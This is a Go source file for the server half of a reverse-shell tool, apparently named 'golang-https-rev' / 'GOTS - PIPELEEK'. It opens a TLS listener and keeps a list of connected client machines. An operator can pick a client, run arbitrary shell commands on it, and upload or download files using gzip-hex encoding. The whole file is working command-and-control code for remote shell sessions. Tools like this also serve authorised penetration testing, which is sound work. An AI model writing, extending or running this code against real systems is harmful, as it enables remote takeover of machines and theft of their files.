package main

import (
	"bytes"
	"compress/gzip"
	"crypto/tls"
	"encoding/hex"
	"fmt"
	"github.com/peterh/liner"
	"io"
	"log"
	"os"
	"path/filepath"
	"strings"

	"golang-https-rev/pkg/certs"
	"golang-https-rev/pkg/server"
	"golang-https-rev/pkg/version"
)

func main() {
	if len(os.Args) != 3 {
		fmt.Fprintf(os.Stderr, "Usage: %s <port> <network-interface>\n", os.Args[0])
		fmt.Fprintf(os.Stderr, "Example: %s 8443 0.0.0.0\n", os.Args[0])
		os.Exit(1)
	}

	port := os.Args[1]
	networkInterface := os.Args[2]

	log.Println("Generating self-signed certificate...")
	cert, err := certs.GenerateSelfSignedCert()
	if err != nil {
		log.Fatalf("Failed to generate certificate: %v", err)
	}
	log.Println("Certificate generated successfully")

	log.Printf("Version: %s (commit %s, date %s)", version.Version, version.Commit, version.Date)

	// Create TLS config
	tlsConfig := &tls.Config{
		Certificates: []tls.Certificate{cert},
		MinVersion:   tls.VersionTLS12,
	}

	// Create listener
	listener := server.NewListener(port, networkInterface, tlsConfig)
	netListener, err := listener.Start()
	if err != nil {
		log.Fatalf("Failed to start listener: %v", err)
	}
	defer netListener.Close()

	log.Println("Listener ready. Waiting for connections...")
	interactiveShell(listener)
}

func compressToHex(data []byte) (string, error) {
	var buf bytes.Buffer
	gz := gzip.NewWriter(&buf)
	if _, err := gz.Write(data); err != nil {
		return "", err
	}
	if err := gz.Close(); err != nil {
		return "", err
	}
	return hex.EncodeToString(buf.Bytes()), nil
}

func decompressHex(payload string) ([]byte, error) {
	compressed, err := hex.DecodeString(payload)
	if err != nil {
		return nil, err
	}
	gz, err := gzip.NewReader(bytes.NewReader(compressed))
	if err != nil {
		return nil, err
	}
	defer gz.Close()
	return io.ReadAll(gz)
}

func parseFileList(output string, prefix string, osType string) []string {
	var completions []string
	lines := strings.Split(output, "\n")

	if osType == "windows" {
		// Parse 'dir' output (Windows)
		// Format: <MM/DD/YYYY HH:MM> <DIR|size> <filename>
		for _, line := range lines {
			line = strings.TrimSpace(line)
			if line == "" || strings.HasPrefix(line, "Volume") || strings.HasPrefix(line, "Directory of") {
				continue
			}

			// Split and get the filename (usually the last part)
			parts := strings.Fields(line)
			if len(parts) < 4 {
				continue
			}

			var filename string
			var isDir bool

			// Check for <DIR> marker
			dirIdx := -1
			for i, p := range parts {
				if p == "<DIR>" {
					dirIdx = i
					break
				}
			}

			if dirIdx >= 0 && dirIdx+1 < len(parts) {
				filename = parts[dirIdx+1]
				isDir = true
			} else if len(parts) >= 4 {
				filename = parts[len(parts)-1]
				isDir = false
			} else {
				continue
			}

			// Skip . and ..
			if filename == "." || filename == ".." {
				continue
			}

			// Match prefix
			if !strings.HasPrefix(filename, prefix) {
				continue
			}

			if isDir {
				completions = append(completions, filename+"/")
			} else {
				completions = append(completions, filename)
			}
		}
	} else {
		// Parse 'ls -la' output (Unix)
		for _, line := range lines {
			fields := strings.Fields(line)
			if len(fields) == 0 {
				continue
			}

			filename := fields[len(fields)-1]

			// Skip . and ..
			if filename == "." || filename == ".." {
				continue
			}

			// Match prefix
			if !strings.HasPrefix(filename, prefix) {
				continue
			}

			// Check if it's a directory by looking for 'd' in the first field
			if len(fields[0]) > 0 && fields[0][0] == 'd' {
				completions = append(completions, filename+"/")
			} else {
				completions = append(completions, filename)
			}
		}
	}

	return completions
}

func interactiveShell(l *server.Listener) {
	line := liner.NewLiner()
	line.SetCtrlCAborts(true)
	defer line.Close()

	var currentClient string
	osTypeCache := make(map[string]string) // clientAddr -> OS type (windows/unix)

	line.SetCompleter(func(input string) []string {
		if currentClient == "" {
			return []string{}
		}

		parts := strings.Fields(input)
		if len(parts) == 0 {
			return []string{}
		}

		prefix := parts[len(parts)-1]
		cmd := parts[0]

		// Handle remote file completion for download/upload when in a session
		if cmd == "download" || cmd == "upload" {
			// Determine which argument we're completing
			argNum := len(parts) - 1

			// For download: first arg is remote, second is local
			// For upload: first arg is local, second is remote
			isRemote := (cmd == "download" && argNum == 1) || (cmd == "upload" && argNum == 2)

			if isRemote {
				// Get OS type from cache or query it
				osType, cached := osTypeCache[currentClient]
				if !cached {
					if err := l.SendCommand(currentClient, "INFO"); err == nil {
						resp, err := l.GetResponse(currentClient, 5000000000)
						if err == nil {
							if strings.Contains(resp, "OS: windows") {
								osType = "windows"
							} else {
								osType = "unix"
							}
							osTypeCache[currentClient] = osType
						}
					}
				}

				// Fetch remote file list via appropriate command
				var listCmd string
				if osType == "windows" {
					listCmd = "dir"
				} else {
					listCmd = "ls -la"
				}

				if err := l.SendCommand(currentClient, listCmd); err == nil {
					resp, err := l.GetResponse(currentClient, 5000000000)
					if err == nil {
						resp = strings.ReplaceAll(resp, "<<<END_OF_OUTPUT>>>", "")
						files := parseFileList(resp, prefix, osType)
						return files
					}
				}
				return []string{}
			}

			// For local paths, use glob
			matches, err := filepath.Glob(prefix + "*")
			if err != nil {
				return []string{}
			}

			var completions []string
			for _, match := range matches {
				info, err := os.Stat(match)
				if err != nil {
					continue
				}
				if info.IsDir() {
					completions = append(completions, match+"/")
				} else {
					completions = append(completions, match)
				}
			}
			return completions
		}

		return []string{}
	})

	fmt.Println("\n=== GOTS - PIPELEEK ===")
	fmt.Println("Commands:")
	fmt.Println("  ls                   - List connected clients")
	fmt.Println("  use <client_id>      - Interact with a specific client")
	fmt.Println("  upload <l> <r>       - Upload local file <l> to remote path <r> (active session)")
	fmt.Println("  download <r> <l>     - Download remote file <r> to local path <l> (active session)")
	fmt.Println("  bg                   - Return to listener prompt from a session")
	fmt.Println("  exit                 - Exit the listener")
	fmt.Println()

	for {
		prompt := "listener> "
		if currentClient != "" {
			prompt = fmt.Sprintf("shell[%s]> ", currentClient)
		}

		input, err := line.Prompt(prompt)
		if err != nil {
			if err == liner.ErrPromptAborted {
				fmt.Println()
				continue
			}
			return
		}

		input = strings.TrimSpace(input)
		if input == "" {
			continue
		}
		line.AppendHistory(input)

		parts := strings.Fields(input)
		command := parts[0]

		if currentClient == "" {
			switch command {
			case "ls":
				clients := l.GetClients()
				if len(clients) == 0 {
					fmt.Println("No clients connected")
				} else {
					fmt.Println("\nConnected Clients:")
					for i, addr := range clients {
						fmt.Printf("  %d. %s\n", i+1, addr)
					}
					fmt.Println()
				}

			case "use":
				if len(parts) < 2 {
					fmt.Println("Usage: use <client_id>")
					continue
				}

				var numIdx int
				if _, err := fmt.Sscanf(parts[1], "%d", &numIdx); err != nil {
					fmt.Printf("Invalid client ID: %s\n", parts[1])
					continue
				}

				clients := l.GetClients()
				if numIdx > 0 && numIdx <= len(clients) {
					currentClient = clients[numIdx-1]
					fmt.Printf("Now interacting with: %s\n", currentClient)
					fmt.Println("Type 'bg' to return to listener prompt")
				} else {
					fmt.Println("Client not found")
				}

			case "exit":
				return

			default:
				fmt.Printf("Unknown command: %s\n", command)
			}
		} else {
			if input == "bg" {
				fmt.Printf("Backgrounding session with %s\n", currentClient)
				currentClient = ""
				continue
			}

			// handle file transfer helpers
			if strings.HasPrefix(input, "upload ") {
				parts := strings.Fields(input)
				if len(parts) != 3 {
					fmt.Println("Usage: upload <local_path> <remote_path>")
					continue
				}
				localPath, remotePath := parts[1], parts[2]
				data, err := os.ReadFile(localPath)
				if err != nil {
					fmt.Printf("Error reading local file: %v\n", err)
					continue
				}
				compressed, err := compressToHex(data)
				if err != nil {
					fmt.Printf("Error compressing file: %v\n", err)
					continue
				}
				cmd := fmt.Sprintf("UPLOAD %s %s", remotePath, compressed)
				if err := l.SendCommand(currentClient, cmd); err != nil {
					fmt.Printf("Error sending upload: %v\n", err)
					currentClient = ""
					continue
				}
				resp, err := l.GetResponse(currentClient, 5000000000)
				if err != nil {
					fmt.Printf("Error getting upload response: %v\n", err)
					currentClient = ""
					continue
				}
				clean := strings.ReplaceAll(resp, "<<<END_OF_OUTPUT>>>", "")
				fmt.Print(clean)
				if !strings.HasSuffix(clean, "\n") {
					fmt.Println()
				}
				continue
			}

			if strings.HasPrefix(input, "download ") {
				parts := strings.Fields(input)
				if len(parts) != 3 {
					fmt.Println("Usage: download <remote_path> <local_path>")
					continue
				}
				remotePath, localPath := parts[1], parts[2]
				cmd := fmt.Sprintf("DOWNLOAD %s", remotePath)
				if err := l.SendCommand(currentClient, cmd); err != nil {
					fmt.Printf("Error sending download: %v\n", err)
					currentClient = ""
					continue
				}
				resp, err := l.GetResponse(currentClient, 5000000000)
				if err != nil {
					fmt.Printf("Error getting download response: %v\n", err)
					currentClient = ""
					continue
				}
				clean := strings.ReplaceAll(resp, "<<<END_OF_OUTPUT>>>", "")
				clean = strings.TrimSpace(clean)
				const prefix = "DATA "
				if !strings.HasPrefix(clean, prefix) {
					fmt.Printf("Unexpected download response (length %d bytes)\n", len(clean))
					continue
				}
				payload := strings.TrimPrefix(clean, prefix)
				decoded, err := decompressHex(payload)
				if err != nil {
					fmt.Printf("Error decoding payload: %v\n", err)
					continue
				}
				if err := os.WriteFile(localPath, decoded, 0644); err != nil {
					fmt.Printf("Error writing local file: %v\n", err)
					continue
				}
				fmt.Printf("Downloaded %d bytes to %s\n", len(decoded), localPath)
				continue
			}

			if err := l.SendCommand(currentClient, input); err != nil {
				fmt.Printf("Error sending command: %v\n", err)
				currentClient = ""
				continue
			}

			resp, err := l.GetResponse(currentClient, 5000000000) // 5 seconds
			if err != nil {
				fmt.Printf("Error getting response: %v\n", err)
				currentClient = ""
				continue
			}

			clean := strings.ReplaceAll(resp, "<<<END_OF_OUTPUT>>>", "")
			fmt.Print(clean)
			if !strings.HasSuffix(clean, "\n") {
				fmt.Println()
			}
		}
	}
}
